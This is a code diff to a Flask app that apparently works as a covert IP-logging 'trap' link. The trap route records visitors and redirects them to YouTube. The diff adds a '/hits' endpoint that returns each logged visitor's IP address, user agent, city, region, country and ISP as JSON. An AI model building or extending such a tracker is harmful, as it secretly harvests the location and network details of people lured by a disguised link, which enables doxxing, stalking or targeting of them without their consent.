@@ -1,4 +1,4 @@
-import os, sqlite3, requests
+import os, sqlite3, requests, json
 from datetime import datetime
 from flask import Flask, request, redirect
 
@@ -40,6 +40,16 @@ def trap(uid):
     db.close()
 
     return redirect("https://www.youtube.com/")
+
+@app.route("/hits")
+def hits():
+    db = init_db()
+    rows = db.execute("SELECT ts,uid,ip,ua,city,region,country,isp "
+                      "FROM hits ORDER BY ts DESC LIMIT 50").fetchall()
+    db.close()
+    data = [dict(zip(["ts","uid","ip","ua","city","region","country","isp"], r))
+            for r in rows]
+    return json.dumps(data, ensure_ascii=False)
 
 @app.route("/")
 def home():
